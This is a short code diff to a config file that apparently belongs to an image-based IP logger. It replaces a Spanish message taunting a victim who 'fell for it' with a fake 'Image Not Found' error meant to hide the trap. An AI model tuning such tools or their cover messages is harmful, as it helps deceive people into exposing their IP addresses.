@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "Caiste chanchito mi loco buena ip", # Message to show
+        "message": "Image Not Found. Try reloading the page.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
